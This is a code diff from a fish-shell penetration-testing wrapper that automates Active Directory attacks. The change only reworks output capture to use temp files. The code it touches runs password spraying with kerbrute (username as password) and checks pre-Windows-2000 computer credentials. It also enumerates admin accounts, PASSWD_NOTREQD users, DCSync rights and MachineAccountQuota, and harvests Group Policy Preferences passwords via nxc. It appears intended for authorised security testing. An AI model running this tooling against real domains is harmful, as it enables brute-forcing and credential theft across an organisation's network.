@@ -443,7 +443,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
 
     ezpz_header "Enumerating privileged users"
     ezpz_cmd "nxc ldap $nxc_auth --admin-count"
-    set -l admins_out (ezpz_spin nxc ldap $nxc_auth --admin-count | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5)
+    set -l admins_tmp (mktemp)
+    ezpz_spin_capture $admins_tmp nxc ldap $nxc_auth --admin-count
+    set -l admins_out (grep -av '\[.\]' $admins_tmp | tr -s " " | cut -d ' ' -f 5)
+    rm -f $admins_tmp
     if test -n "$admins_out"
         printf '%s\n' $admins_out
     else
@@ -452,7 +455,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
 
     ezpz_header "Enumerating user descriptions"
     ezpz_cmd "nxc ldap $nxc_auth -M get-desc-users"
-    set -l descriptions_out (ezpz_spin nxc ldap $nxc_auth -M get-desc-users | grep -a --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t)
+    set -l descriptions_tmp (mktemp)
+    ezpz_spin_capture $descriptions_tmp nxc ldap $nxc_auth -M get-desc-users
+    set -l descriptions_out (grep -a --color=never -o "User:.*" $descriptions_tmp | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t)
+    rm -f $descriptions_tmp
     if test -n "$descriptions_out"
         printf '%s\n' $descriptions_out
     else
@@ -529,7 +535,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
 
     ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
     ezpz_cmd "nxc ldap $nxc_auth --password-not-required"
-    set -l passwd_notreq_out (ezpz_spin nxc ldap $nxc_auth --password-not-required | grep --color=never -ao "User:.*")
+    set -l passwd_notreq_tmp (mktemp)
+    ezpz_spin_capture $passwd_notreq_tmp nxc ldap $nxc_auth --password-not-required
+    set -l passwd_notreq_out (grep --color=never -ao "User:.*" $passwd_notreq_tmp)
+    rm -f $passwd_notreq_tmp
     if test -n "$passwd_notreq_out"
         printf '%s\n' $passwd_notreq_out
     else
@@ -575,7 +584,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
             end
 
             ezpz_cmd "$pre2k_cmd"
-            set -l pre2k_out (ezpz_spin $pre2k_cmd | grep -aioE "VALID CREDENTIALS: .*" --color=never)
+            set -l pre2k_tmp (mktemp)
+            ezpz_spin_capture $pre2k_tmp $pre2k_cmd
+            set -l pre2k_out (grep -aioE "VALID CREDENTIALS: .*" --color=never $pre2k_tmp)
+            rm -f $pre2k_tmp
             if test -n "$pre2k_out"
                 printf '%s\n' $pre2k_out
             else
@@ -591,7 +603,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         ezpz_header "Bruteforcing credentials with username as password"
         if test -s $users_tmp
             ezpz_cmd "kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass"
-            set -l userpass_out (ezpz_spin kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g; s/^(VALID LOGIN( WITH ERROR)?):[[:space:]]*/\1: /')
+            set -l userpass_tmp (mktemp)
+            ezpz_spin_capture $userpass_tmp kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass
+            set -l userpass_out (grep -aoE "VALID LOGIN.*" $userpass_tmp | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g; s/^(VALID LOGIN( WITH ERROR)?):[[:space:]]*/\1: /')
+            rm -f $userpass_tmp
             if test -n "$userpass_out"
                 printf '%s\n' $userpass_out
             else
@@ -639,13 +654,16 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
 
     ezpz_header "Searching for trust relationships"
     set -l trusts_out
+    set -l trusts_tmp (mktemp)
     if set -q nxc_auth_ip
         ezpz_cmd "nxc ldap $nxc_auth_ip --dc-list"
-        set trusts_out (ezpz_spin nxc ldap $nxc_auth_ip --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
+        ezpz_spin_capture $trusts_tmp nxc ldap $nxc_auth_ip --dc-list
     else
         ezpz_cmd "nxc ldap $nxc_auth --dc-list"
-        set trusts_out (ezpz_spin nxc ldap $nxc_auth --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
+        ezpz_spin_capture $trusts_tmp nxc ldap $nxc_auth --dc-list
     end
+    set trusts_out (grep -av '\[.\]' $trusts_tmp | tr -s " " | cut -d ' ' -f 5-)
+    rm -f $trusts_tmp
     if test -n "$trusts_out"
         printf '%s\n' $trusts_out
     else
@@ -654,7 +672,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
 
     ezpz_header "Enumerating MachineAccountQuota (MAQ)"
     ezpz_cmd "nxc ldap $nxc_auth -M maq"
-    set -l maq_out (ezpz_spin nxc ldap $nxc_auth -M maq | grep -aoE "MachineAccountQuota: .*" --color=never)
+    set -l maq_tmp (mktemp)
+    ezpz_spin_capture $maq_tmp nxc ldap $nxc_auth -M maq
+    set -l maq_out (grep -aoE "MachineAccountQuota: .*" --color=never $maq_tmp)
+    rm -f $maq_tmp
     if test -n "$maq_out"
         printf '%s\n' $maq_out
     else
@@ -700,7 +721,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         end
     end
     ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=\"$target_dn\" ACTION=read RIGHTS=DCSync"
-    set -l dcsync_out (ezpz_spin nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync | grep -a "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//')
+    set -l dcsync_tmp (mktemp)
+    ezpz_spin_capture $dcsync_tmp nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync
+    set -l dcsync_out (grep -a "Trustee" $dcsync_tmp | cut -d ":" -f 2 | sed 's/^[[:space:]]*//')
+    rm -f $dcsync_tmp
     if test -n "$dcsync_out"
         printf '%s\n' $dcsync_out
     else
@@ -749,8 +773,12 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     ezpz_header "Searching for credentials in Group Policy Preferences (GPP)"
     ezpz_cmd "nxc smb $nxc_auth -M gpp_password -M gpp_autologin"
     set -l gpp_out
-    set -a gpp_out (ezpz_spin nxc smb $nxc_auth -M gpp_password | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never)
-    set -a gpp_out (ezpz_spin nxc smb $nxc_auth -M gpp_autologin | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never)
+    set -l gpp_tmp (mktemp)
+    ezpz_spin_capture $gpp_tmp nxc smb $nxc_auth -M gpp_password
+    set -a gpp_out (grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never $gpp_tmp)
+    ezpz_spin_capture $gpp_tmp nxc smb $nxc_auth -M gpp_autologin
+    set -a gpp_out (grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never $gpp_tmp)
+    rm -f $gpp_tmp
     if test -n "$gpp_out"
         printf '%s\n' $gpp_out
     else
